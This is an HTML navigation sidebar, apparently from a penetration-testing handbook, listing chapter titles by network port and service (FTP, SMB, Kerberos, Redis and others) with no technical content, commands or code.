                    Pentesting Network
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="6.1.1" data-path="../../pentesting/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.html">
            
                <a href="../../pentesting/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.html">
            
                    
                    Spoofing LLMNR, NBT-NS, mDNS/DNS and WPAD and Relay Attacks
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.1.2" data-path="../../pentesting/pentesting-network/spoofing-ssdp-and-upnp-devices.html">
            
                <a href="../../pentesting/pentesting-network/spoofing-ssdp-and-upnp-devices.html">
            
                    
                    Spoofing SSDP and UPnP Devices with EvilSSDP
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.1.3" data-path="../../pentesting/pentesting-network/wifi-attacks/">
            
                <a href="../../pentesting/pentesting-network/wifi-attacks/">
            
                    
                    Wifi Attacks
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="6.1.3.1" data-path="../../pentesting/pentesting-network/wifi-attacks/evil-twin-eap-tls.html">
            
                <a href="../../pentesting/pentesting-network/wifi-attacks/evil-twin-eap-tls.html">
            
                    
                    Evil Twin EAP-TLS
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="6.1.4" data-path="../../pentesting/pentesting-network/pentesting-ipv6.html">
            
                <a href="../../pentesting/pentesting-network/pentesting-ipv6.html">
            
                    
                    Pentesting IPv6
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.1.5" data-path="../../pentesting/pentesting-network/nmap-summary-esp.html">
            
                <a href="../../pentesting/pentesting-network/nmap-summary-esp.html">
            
                    
                    Nmap Summary (ESP)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.1.6" data-path="../../pentesting/pentesting-network/network-protocols-explained-esp.html">
            
                <a href="../../pentesting/pentesting-network/network-protocols-explained-esp.html">
            
                    
                    Network Protocols Explained (ESP)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.1.7" data-path="../../pentesting/pentesting-network/ids-evasion.html">
            
                <a href="../../pentesting/pentesting-network/ids-evasion.html">
            
                    
                    IDS and IPS Evasion
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.1.8" data-path="../../pentesting/pentesting-network/dhcpv6.html">
            
                <a href="../../pentesting/pentesting-network/dhcpv6.html">
            
                    
                    DHCPv6
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="6.2" data-path="../../pentesting/pentesting-jdwp-java-debug-wire-protocol.html">
            
                <a href="../../pentesting/pentesting-jdwp-java-debug-wire-protocol.html">
            
                    
                    Pentesting JDWP - Java Debug Wire Protocol
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.3" data-path="../../pentesting/pentesting-printers/">
            
                <a href="../../pentesting/pentesting-printers/">
            
                    
                    Pentesting Printers
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="6.3.1" data-path="../../pentesting/pentesting-printers/accounting-bypass.html">
            
                <a href="../../pentesting/pentesting-printers/accounting-bypass.html">
            
                    
                    Accounting bypass
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.3.2" data-path="../../pentesting/pentesting-printers/buffer-overflows.html">
            
                <a href="../../pentesting/pentesting-printers/buffer-overflows.html">
            
                    
                    Buffer Overflows
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.3.3" data-path="../../pentesting/pentesting-printers/credentials-disclosure-brute-force.html">
            
                <a href="../../pentesting/pentesting-printers/credentials-disclosure-brute-force.html">
            
                    
                    Credentials Disclosure / Brute-Force
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.3.4" data-path="../../pentesting/pentesting-printers/cross-site-printing.html">
            
                <a href="../../pentesting/pentesting-printers/cross-site-printing.html">
            
                    
                    Cross-Site Printing
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.3.5" data-path="../../pentesting/pentesting-printers/document-processing.html">
            
                <a href="../../pentesting/pentesting-printers/document-processing.html">
            
                    
                    Document Processing
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.3.6" data-path="../../pentesting/pentesting-printers/factory-defaults.html">
            
                <a href="../../pentesting/pentesting-printers/factory-defaults.html">
            
                    
                    Factory Defaults
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.3.7" data-path="../../pentesting/pentesting-printers/file-system-access.html">
            
                <a href="../../pentesting/pentesting-printers/file-system-access.html">
            
                    
                    File system access
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.3.8" data-path="../../pentesting/pentesting-printers/firmware-updates.html">
            
                <a href="../../pentesting/pentesting-printers/firmware-updates.html">
            
                    
                    Firmware updates
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.3.9" data-path="../../pentesting/pentesting-printers/memory-access.html">
            
                <a href="../../pentesting/pentesting-printers/memory-access.html">
            
                    
                    Memory Access
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.3.10" data-path="../../pentesting/pentesting-printers/physical-damage.html">
            
                <a href="../../pentesting/pentesting-printers/physical-damage.html">
            
                    
                    Physical Damage
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.3.11" data-path="../../pentesting/pentesting-printers/software-packages.html">
            
                <a href="../../pentesting/pentesting-printers/software-packages.html">
            
                    
                    Software packages
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.3.12" data-path="../../pentesting/pentesting-printers/transmission-channel.html">
            
                <a href="../../pentesting/pentesting-printers/transmission-channel.html">
            
                    
                    Transmission channel
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.3.13" data-path="../../pentesting/pentesting-printers/print-job-manipulation.html">
            
                <a href="../../pentesting/pentesting-printers/print-job-manipulation.html">
            
                    
                    Print job manipulation
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.3.14" data-path="../../pentesting/pentesting-printers/print-job-retention.html">
            
                <a href="../../pentesting/pentesting-printers/print-job-retention.html">
            
                    
                    Print Job Retention
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.3.15" data-path="../../pentesting/pentesting-printers/scanner-and-fax.html">
            
                <a href="../../pentesting/pentesting-printers/scanner-and-fax.html">
            
                    
                    Scanner and Fax
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="6.4" data-path="../../pentesting/7-tcp-udp-pentesting-echo.html">
            
                <a href="../../pentesting/7-tcp-udp-pentesting-echo.html">
            
                    
                    7/tcp/udp - Pentesting Echo
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.5" data-path="../../pentesting/pentesting-ftp/">
            
                <a href="../../pentesting/pentesting-ftp/">
            
                    
                    21 - Pentesting FTP
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="6.5.1" data-path="../../pentesting/pentesting-ftp/ftp-bounce-attack.html">
            
                <a href="../../pentesting/pentesting-ftp/ftp-bounce-attack.html">
            
                    
                    FTP Bounce attack - Scan
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.5.2" data-path="../../pentesting/pentesting-ftp/ftp-bounce-download-2oftp-file.html">
            
                <a href="../../pentesting/pentesting-ftp/ftp-bounce-download-2oftp-file.html">
            
                    
                    FTP Bounce - Download 2ÂºFTP file
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="6.6" data-path="../../pentesting/pentesting-ssh.html">
            
                <a href="../../pentesting/pentesting-ssh.html">
            
                    
                    22 - Pentesting SSH/SFTP
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.7" data-path="../../pentesting/pentesting-telnet.html">
            
                <a href="../../pentesting/pentesting-telnet.html">
            
                    
                    23 - Pentesting Telnet
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.8" data-path="../../pentesting/pentesting-smtp/">
            
                <a href="../../pentesting/pentesting-smtp/">
            
                    
                    25,465,587 - Pentesting SMTP/s
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="6.8.1" data-path="../../pentesting/pentesting-smtp/smtp-commands.html">
            
                <a href="../../pentesting/pentesting-smtp/smtp-commands.html">
            
                    
                    SMTP - Commands
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="6.9" data-path="../../pentesting/43-pentesting-whois.html">
            
                <a href="../../pentesting/43-pentesting-whois.html">
            
                    
                    43 - Pentesting WHOIS
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.10" data-path="../../pentesting/pentesting-dns.html">
            
                <a href="../../pentesting/pentesting-dns.html">
            
                    
                    53 - Pentesting DNS
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.11" data-path="../../pentesting/69-udp-tftp.html">
            
                <a href="../../pentesting/69-udp-tftp.html">
            
                    
                    69/UDP TFTP/Bittorrent-tracker
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.12" data-path="../../pentesting/pentesting-finger.html">
            
                <a href="../../pentesting/pentesting-finger.html">
            
                    
                    79 - Pentesting Finger
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.13" data-path="../../pentesting/pentesting-web/">
            
                <a href="../../pentesting/pentesting-web/">
            
                    
                    80,443 - Pentesting Web Methodology
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="6.13.1" data-path="../../pentesting/pentesting-web/spring-actuators.html">
            
                <a href="../../pentesting/pentesting-web/spring-actuators.html">
            
                    
                    Spring Actuators
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.13.2" data-path="../../pentesting/pentesting-web/artifactory-hacking-guide.html">
            
                <a href="../../pentesting/pentesting-web/artifactory-hacking-guide.html">
            
                    
                    Artifactory Hacking guide
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.13.3" data-path="../../pentesting/pentesting-web/apache.html">
            
                <a href="../../pentesting/pentesting-web/apache.html">
            
                    
                    Apache
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.13.4" data-path="../../pentesting/pentesting-web/jsp.html">
            
                <a href="../../pentesting/pentesting-web/jsp.html">
            
                    
                    JSP
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.13.5" data-path="../../pentesting/pentesting-web/api-pentesting.html">
            
                <a href="../../pentesting/pentesting-web/api-pentesting.html">
            
                    
                    API Pentesting
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.13.6" data-path="../../pentesting/pentesting-web/buckets/">
            
                <a href="../../pentesting/pentesting-web/buckets/">
            
                    
                    Buckets
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="6.13.6.1" data-path="../../pentesting/pentesting-web/buckets/firebase-database.html">
            
                <a href="../../pentesting/pentesting-web/buckets/firebase-database.html">
            
                    
                    Firebase Database
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.13.6.2" data-path="../../pentesting/pentesting-web/buckets/aws-s3.html">
            
                <a href="../../pentesting/pentesting-web/buckets/aws-s3.html">
            
                    
                    AWS-S3
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="6.13.7" data-path="../../pentesting/pentesting-web/cgi.html">
            
                <a href="../../pentesting/pentesting-web/cgi.html">
            
                    
                    CGI
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.13.8" data-path="../../pentesting/pentesting-web/drupal.html">
            
                <a href="../../pentesting/pentesting-web/drupal.html">
            
                    
                    Drupal
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.13.9" data-path="../../pentesting/pentesting-web/flask.html">
            
                <a href="../../pentesting/pentesting-web/flask.html">
            
                    
                    Flask
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.13.10" data-path="../../pentesting/pentesting-web/git.html">
            
                <a href="../../pentesting/pentesting-web/git.html">
            
                    
                    Git
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.13.11" data-path="../../pentesting/pentesting-web/graphql.html">
            
                <a href="../../pentesting/pentesting-web/graphql.html">
            
                    
                    GraphQL
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.13.12" data-path="../../pentesting/pentesting-web/h2-java-sql-database.html">
            
                <a href="../../pentesting/pentesting-web/h2-java-sql-database.html">
            
                    
                    H2 - Java SQL database
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.13.13" data-path="../../pentesting/pentesting-web/iis-internet-information-services.html">
            
                <a href="../../pentesting/pentesting-web/iis-internet-information-services.html">
            
                    
                    IIS - Internet Information Services
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.13.14" data-path="../../pentesting/pentesting-web/jboss.html">
            
                <a href="../../pentesting/pentesting-web/jboss.html">
            
                    
                    JBOSS
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.13.15" data-path="../../pentesting/pentesting-web/jenkins.html">
            
                <a href="../../pentesting/pentesting-web/jenkins.html">
            
                    
                    Jenkins
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.13.16" data-path="../../pentesting/pentesting-web/jira.html">
            
                <a href="../../pentesting/pentesting-web/jira.html">
            
                    
                    JIRA
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.13.17" data-path="../../pentesting/pentesting-web/joomla.html">
            
                <a href="../../pentesting/pentesting-web/joomla.html">
            
                    
                    Joomla
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.13.18" data-path="../../pentesting/pentesting-web/nginx.html">
            
                <a href="../../pentesting/pentesting-web/nginx.html">
            
                    
                    Nginx
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.13.19" data-path="../../pentesting/pentesting-web/php-tricks-esp/">
            
                <a href="../../pentesting/pentesting-web/php-tricks-esp/">
            
                    
                    PHP Tricks (SPA)
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="6.13.19.1" data-path="../../pentesting/pentesting-web/php-tricks-esp/php-useful-functions.html">
            
                <a href="../../pentesting/pentesting-web/php-tricks-esp/php-useful-functions.html">
            
                    
                    PHP - Useful Functions (disabled bypass)
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="6.13.20" data-path="../../pentesting/pentesting-web/python.html">
            
                <a href="../../pentesting/pentesting-web/python.html">
            
                    
                    Python
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.13.21" data-path="../../pentesting/pentesting-web/spel-spring-expression-language.html">
            
                <a href="../../pentesting/pentesting-web/spel-spring-expression-language.html">
            
                    
                    SpEL - Spring Expression Language
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.13.22" data-path="../../pentesting/pentesting-web/tomcat.html">
            
                <a href="../../pentesting/pentesting-web/tomcat.html">
            
                    
                    Tomcat
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.13.23" data-path="../../pentesting/pentesting-web/vmware-esx-vcenter....html">
            
                <a href="../../pentesting/pentesting-web/vmware-esx-vcenter....html">
            
                    
                    VMWare (ESX, VCenter...)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.13.24" data-path="../../pentesting/pentesting-web/put-method-webdav.html">
            
                <a href="../../pentesting/pentesting-web/put-method-webdav.html">
            
                    
                    WebDav
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.13.25" data-path="../../pentesting/pentesting-web/werkzeug.html">
            
                <a href="../../pentesting/pentesting-web/werkzeug.html">
            
                    
                    werkzeug
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.13.26" data-path="../../pentesting/pentesting-web/wordpress.html">
            
                <a href="../../pentesting/pentesting-web/wordpress.html">
            
                    
                    Wordpress
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="6.14" data-path="../../pentesting/pentesting-kerberos-88/">
            
                <a href="../../pentesting/pentesting-kerberos-88/">
            
                    
                    88tcp/udp - Pentesting Kerberos
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="6.14.1" data-path="../../pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.html">
            
                <a href="../../pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.html">
            
                    
                    Harvesting tickets from Windows
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.14.2" data-path="../../pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.html">
            
                <a href="../../pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.html">
            
                    
                    Harvesting tickets from Linux
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="6.15" data-path="../../pentesting/pentesting-pop.html">
            
                <a href="../../pentesting/pentesting-pop.html">
            
                    
                    110,995 - Pentesting POP
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.16" data-path="../../pentesting/pentesting-rpcbind.html">
            
                <a href="../../pentesting/pentesting-rpcbind.html">
            
                    
                    111/TCP/UDP - Pentesting Portmapper
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.17" data-path="../../pentesting/113-pentesting-ident.html">
            
                <a href="../../pentesting/113-pentesting-ident.html">
            
                    
                    113 - Pentesting Ident
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.18" data-path="../../pentesting/pentesting-ntp.html">
            
                <a href="../../pentesting/pentesting-ntp.html">
            
                    
                    123/udp - Pentesting NTP
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.19" data-path="../../pentesting/135-pentesting-msrpc.html">
            
                <a href="../../pentesting/135-pentesting-msrpc.html">
            
                    
                    135, 593 - Pentesting MSRPC
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.20" data-path="../../pentesting/137-138-139-pentesting-netbios.html">
            
                <a href="../../pentesting/137-138-139-pentesting-netbios.html">
            
                    
                    137,138,139 - Pentesting NetBios
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.21" data-path="../../pentesting/pentesting-smb.html">
            
                <a href="../../pentesting/pentesting-smb.html">
            
                    
                    139,445 - Pentesting SMB
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.22" data-path="../../pentesting/pentesting-imap.html">
            
                <a href="../../pentesting/pentesting-imap.html">
            
                    
                    143,993 - Pentesting IMAP
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.23" data-path="../../pentesting/pentesting-snmp.html">
            
                <a href="../../pentesting/pentesting-snmp.html">
            
                    
                    161,162,10161,10162/udp - Pentesting SNMP
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.24" data-path="../../pentesting/pentesting-irc.html">
            
                <a href="../../pentesting/pentesting-irc.html">
            
                    
                    194,6667,6660-7000 - Pentesting IRC
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.25" data-path="../../pentesting/pentesting-264-check-point-firewall-1.html">
            
                <a href="../../pentesting/pentesting-264-check-point-firewall-1.html">
            
                    
                    264 - Pentesting Check Point FireWall-1
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.26" data-path="../../pentesting/pentesting-ldap.html">
            
                <a href="../../pentesting/pentesting-ldap.html">
            
                    
                    389, 636, 3268, 3269 - Pentesting LDAP
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.27" data-path="../../pentesting/ipsec-ike-vpn-pentesting.html">
            
                <a href="../../pentesting/ipsec-ike-vpn-pentesting.html">
            
                    
                    500/udp - Pentesting IPsec/IKE VPN
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.28" data-path="../../pentesting/pentesting-modbus.html">
            
                <a href="../../pentesting/pentesting-modbus.html">
            
                    
                    502 - Pentesting Modbus
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.29" data-path="../../pentesting/512-pentesting-rexec.html">
            
                <a href="../../pentesting/512-pentesting-rexec.html">
            
                    
                    512 - Pentesting Rexec
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.30" data-path="../../pentesting/pentesting-rlogin.html">
            
                <a href="../../pentesting/pentesting-rlogin.html">
            
                    
                    513 - Pentesting Rlogin
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.31" data-path="../../pentesting/pentesting-rsh.html">
            
                <a href="../../pentesting/pentesting-rsh.html">
            
                    
                    514 - Pentesting Rsh
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.32" data-path="../../pentesting/515-pentesting-line-printer-daemon-lpd.html">
            
                <a href="../../pentesting/515-pentesting-line-printer-daemon-lpd.html">
            
                    
                    515 - Pentesting Line Printer Daemon (LPD)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.33" data-path="../../pentesting/584-pentesting-afp.html">
            
                <a href="../../pentesting/584-pentesting-afp.html">
            
                    
                    548 - Pentesting Apple Filing Protocol (AFP)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.34" data-path="../../pentesting/554-8554-pentesting-rtsp.html">
            
                <a href="../../pentesting/554-8554-pentesting-rtsp.html">
            
                    
                    554,8554 - Pentesting RTSP
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.35" data-path="../../pentesting/623-udp-ipmi.html">
            
                <a href="../../pentesting/623-udp-ipmi.html">
            
                    
                    623/UDP/TCP - IPMI
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.36" data-path="../../pentesting/pentesting-631-internet-printing-protocol-ipp.html">
            
                <a href="../../pentesting/pentesting-631-internet-printing-protocol-ipp.html">
            
                    
                    631 - Internet Printing Protocol(IPP)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.37" data-path="../../pentesting/873-pentesting-rsync.html">
            
                <a href="../../pentesting/873-pentesting-rsync.html">
            
                    
                    873 - Pentesting Rsync
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.38" data-path="../../pentesting/1026-pentesting-rusersd.html">
            
                <a href="../../pentesting/1026-pentesting-rusersd.html">
            
                    
                    1026 - Pentesting Rusersd
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.39" data-path="../../pentesting/1099-pentesting-java-rmi.html">
            
                <a href="../../pentesting/1099-pentesting-java-rmi.html">
            
                    
                    1098/1099 - Pentesting Java RMI
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.40" data-path="../../pentesting/pentesting-mssql-microsoft-sql-server.html">
            
                <a href="../../pentesting/pentesting-mssql-microsoft-sql-server.html">
            
                    
                    1433 - Pentesting MSSQL - Microsoft SQL Server
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.41" data-path="../../pentesting/1521-1522-1529-pentesting-oracle-listener/">
            
                <a href="../../pentesting/1521-1522-1529-pentesting-oracle-listener/">
            
                    
                    1521,1522-1529 - Pentesting Oracle TNS Listener
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="6.41.1" data-path="../../pentesting/1521-1522-1529-pentesting-oracle-listener/oracle-pentesting-requirements-installation.html">
            
                <a href="../../pentesting/1521-1522-1529-pentesting-oracle-listener/oracle-pentesting-requirements-installation.html">
            
                    
                    Oracle Pentesting requirements installation
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.41.2" data-path="../../pentesting/1521-1522-1529-pentesting-oracle-listener/tns-poison.html">
            
                <a href="../../pentesting/1521-1522-1529-pentesting-oracle-listener/tns-poison.html">
            
                    
                    TNS Poison
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.41.3" data-path="../../pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.html">
            
                <a href="../../pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.html">
            
                    
                    Remote stealth pass brute force
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.41.4" data-path="../../pentesting/1521-1522-1529-pentesting-oracle-listener/oracle-rce-and-more.html">
            
                <a href="../../pentesting/1521-1522-1529-pentesting-oracle-listener/oracle-rce-and-more.html">
            
                    
                    Oracle RCE & more
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="6.42" data-path="../../pentesting/1723-pentesting-pptp.html">
            
                <a href="../../pentesting/1723-pentesting-pptp.html">
            
                    
                    1723 - Pentesting PPTP
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.43" data-path="../../pentesting/1883-pentesting-mqtt-mosquitto.html">
            
                <a href="../../pentesting/1883-pentesting-mqtt-mosquitto.html">
            
                    
                    1883 - Pentesting MQTT (Mosquitto)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.44" data-path="../../pentesting/nfs-service-pentesting.html">
            
                <a href="../../pentesting/nfs-service-pentesting.html">
            
                    
                    2049 - Pentesting NFS Service
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.45" data-path="../../pentesting/pentesting-compaq-hp-insight-manager.html">
            
                <a href="../../pentesting/pentesting-compaq-hp-insight-manager.html">
            
                    
                    2301,2381 - Pentesting Compaq/HP Insight Manager
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.46" data-path="../../pentesting/3260-pentesting-iscsi.html">
            
                <a href="../../pentesting/3260-pentesting-iscsi.html">
            
                    
                    3260 - Pentesting ISCSI
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.47" data-path="../../pentesting/3299-pentesting-saprouter.html">
            
                <a href="../../pentesting/3299-pentesting-saprouter.html">
            
                    
                    3299 - Pentesting SAPRouter
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.48" data-path="../../pentesting/pentesting-mysql.html">
            
                <a href="../../pentesting/pentesting-mysql.html">
            
                    
                    3306 - Pentesting Mysql
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.49" data-path="../../pentesting/pentesting-rdp.html">
            
                <a href="../../pentesting/pentesting-rdp.html">
            
                    
                    3389 - Pentesting RDP
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.50" data-path="../../pentesting/3632-pentesting-distcc.html">
            
                <a href="../../pentesting/3632-pentesting-distcc.html">
            
                    
                    3632 - Pentesting distcc
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.51" data-path="../../pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd.html">
            
                <a href="../../pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd.html">
            
                    
                    4369 - Pentesting Erlang Port Mapper Daemon (epmd)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.52" data-path="../../pentesting/5353-udp-multicast-dns-mdns.html">
            
                <a href="../../pentesting/5353-udp-multicast-dns-mdns.html">
            
                    
                    5353/UDP Multicast DNS (mDNS)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.53" data-path="../../pentesting/pentesting-postgresql.html">
            
                <a href="../../pentesting/pentesting-postgresql.html">
            
                    
                    5432,5433 - Pentesting Postgresql
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.54" data-path="../../pentesting/5671-5672-pentesting-amqp.html">
            
                <a href="../../pentesting/5671-5672-pentesting-amqp.html">
            
                    
                    5671,5672 - Pentesting AMQP
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.55" data-path="../../pentesting/pentesting-vnc.html">
            
                <a href="../../pentesting/pentesting-vnc.html">
            
                    
                    5800,5801,5900,5901 - Pentesting VNC
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.56" data-path="../../pentesting/5984-pentesting-couchdb.html">
            
                <a href="../../pentesting/5984-pentesting-couchdb.html">
            
                    
                    5984,6984 - Pentesting CouchDB
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.57" data-path="../../pentesting/5985-5986-pentesting-winrm.html">
            
                <a href="../../pentesting/5985-5986-pentesting-winrm.html">
            
                    
                    5985,5986 - Pentesting WinRM
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.58" data-path="../../pentesting/6000-pentesting-x11.html">
            
                <a href="../../pentesting/6000-pentesting-x11.html">
            
                    
                    6000 - Pentesting X11
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.59" data-path="../../pentesting/6379-pentesting-redis.html">
            
                <a href="../../pentesting/6379-pentesting-redis.html">
            
                    
                    6379 - Pentesting Redis
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.60" data-path="../../pentesting/8009-pentesting-apache-jserv-protocol-ajp.html">
            
                <a href="../../pentesting/8009-pentesting-apache-jserv-protocol-ajp.html">
            
                    
                    8009 - Pentesting Apache JServ Protocol (AJP)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.61" data-path="../../pentesting/cassandra.html">
            
                <a href="../../pentesting/cassandra.html">
            
                    
                    9042/9160 - Pentesting Cassandra
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.62" data-path="../../pentesting/9100-pjl.html">
            
                <a href="../../pentesting/9100-pjl.html">
            
                    
                    9100 - Pentesting Raw Printing (JetDirect, AppSocket, PDL-datastream)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.63" data-path="../../pentesting/9200-pentesting-elasticsearch.html">
            
                <a href="../../pentesting/9200-pentesting-elasticsearch.html">
            
                    
                    9200 - Pentesting Elasticsearch
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.64" data-path="../../pentesting/10000-network-data-management-protocol-ndmp.html">
            
                <a href="../../pentesting/10000-network-data-management-protocol-ndmp.html">
            
                    
                    10000 - Pentesting Network Data Management Protocol (ndmp)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.65" data-path="../../pentesting/11211-memcache.html">
            
                <a href="../../pentesting/11211-memcache.html">
            
                    
                    11211 - Pentesting Memcache
            
                </a>
            

            
        </li>
    
